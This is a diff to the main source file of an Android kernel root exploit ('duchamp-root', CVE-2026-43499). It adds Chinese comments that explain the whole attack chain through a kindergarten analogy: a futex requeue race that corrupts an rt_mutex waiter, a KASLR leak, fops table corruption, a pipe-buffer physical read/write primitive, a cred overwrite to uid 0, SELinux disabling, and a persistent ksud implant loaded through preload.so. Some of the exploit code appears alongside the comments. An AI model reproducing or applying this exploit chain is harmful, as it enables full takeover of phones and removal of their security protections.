@@ -1,3 +1,22 @@
+/* ==========================================================================
+ * 【闯关总地图】duchamp-root 一键 Root — "幼儿园闯关游戏"版注释
+ * ==========================================================================
+ * 园长     = 手机内核（最高权威，管着所有小朋友和玩具）
+ * 小朋友   = 普通 App（只能玩自己的玩具）
+ * 园长助手 = root 权限（可开所有柜子、改所有规则、发糖果）
+ * 门锁缺陷 = CVE-2026-43499（rt_mutex "鬼标签"漏洞）
+ * 魔法道具 = preload.so（本文件编译产物，塞进书包带进幼儿园）
+ *
+ * 五关流程：
+ *   第 1 关  偷看园长排班表     slide.c   = 弄清园长办公室门牌号(KASLR 泄漏 _stext)
+ *   第 2 关  偷换玩具柜钥匙牌   fops.c    = 涂改 ops 表，假装"被授权开柜子的人"
+ *   第 3 关  拿到万能钥匙       pipe.c    = pipe buffer 改造成任意物理地址读写模具
+ *   第 4 关  戴上园长徽章       root.c    = 改人事档案 cred(uid=0)、请走检查员
+ *   第 5 关  安插自己的管家     preload.c = 藏进书包的 ksud 小机器人永久安家
+ *
+ * 本文件 main.c = 闯关报名处：按顺序带队闯完五关。
+ * ========================================================================== */
+
 #include "common.h"
 
 uint32_t f_wait;
@@ -18,6 +37,14 @@ atomic_int pipe_prepare_request;
 atomic_int pipe_prepare_done;
 int memfd_leak;
 
+/* --------------------------------------------------------------------------
+ * 三位"演双簧"的小朋友（第 2 关起反复用到的一套编排）：
+ *   waiter  = 传纸条的小朋友：先抢到 pi_chain 玩具，再去 f_wait 排队等换玩具
+ *   owner   = 占着 pi_target 玩具的小朋友：故意也去排队抢 pi_chain，
+ *             和 waiter 面对面互相等对方 —— 制造"死锁环"触发园长的 buggy 逻辑
+ *   consumer= 捣乱的小朋友：趁 waiter 在 pselect 里睡觉时反复喊老师
+ *             "给 waiter 改优先级"(sched_setattr)，逼园长沿着鬼标签走路
+ * -------------------------------------------------------------------------- */
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
@@ -146,6 +173,9 @@ void reset_main_route_state(void) {
   cfi_last_errno = 0;
 }
 
+/* 【开场编排】等三位小朋友就位后，喊一声"换玩具！"(FUTEX_CMP_REQUEUE_PI)。
+ * 园长处理换玩具时发现死锁环(EDEADLK)，回滚路径里会把 waiter 的排队标签
+ * (内核栈上的 rt_mutex_waiter)错摘成别人挂的假标签 —— "鬼标签"就此诞生。 */
 void run_main_route_threads(void) {
   reset_main_route_state();
 
@@ -175,6 +205,12 @@ void run_main_route_threads(void) {
 
 int opt_disabled_selinux;
 
+/* 【闯关主流程】五关按顺序闯：
+ * 1) perf 或 slide 路线偷看排班表，拿到园长办公室门牌号(KASLR _stext)
+ * 2) 准备"魔法书包"(回收一个内核页)再演双簧，偷换玩具柜钥匙牌(FOPS)
+ * 3) (fops.c 内部继续) 用钥匙牌打开特殊柜子，把魔法水管(pipe)改造成万能钥匙
+ * 4) (pipe.c -> root.c) 用万能钥匙改人事档案，戴上园长徽章
+ * 5) (root.c -> preload.c) 派出书包里的 ksud 小管家永久安家 */
 int run_exploit(int argc, char **argv) {
   opt_disabled_selinux = 0;
   char *env = getenv("DISABLE_SELINUX");
@@ -194,6 +230,8 @@ int run_exploit(int argc, char **argv) {
   init_ashmem_path();
 
   pin_to_core(CORE);
+  /* 【第 1 关】先试"偷看奖品柜玻璃反光"(perf 侧信道)；不行再用
+   * "传话纸条背面墨痕"(slide 路线) 拼出园长办公室门牌号 */
   uint64_t text_base = perf_leak_text_base();
   if (text_base) {
     kaslr_base = text_base;
@@ -208,8 +246,11 @@ int run_exploit(int argc, char **argv) {
   }
 
   pin_to_core(CORE);
+  /* 【魔法书包】回收一个我们能控制内容的内核页 —— 后面所有关卡都要把
+   * 假结构体(假排班表/假钥匙牌/假水管)放进这个页里 */
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
 
+  /* 【第 2~3 关】演双簧 + 偷换钥匙牌 + 改造魔法水管 */
   run_main_route_threads();
 
   pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
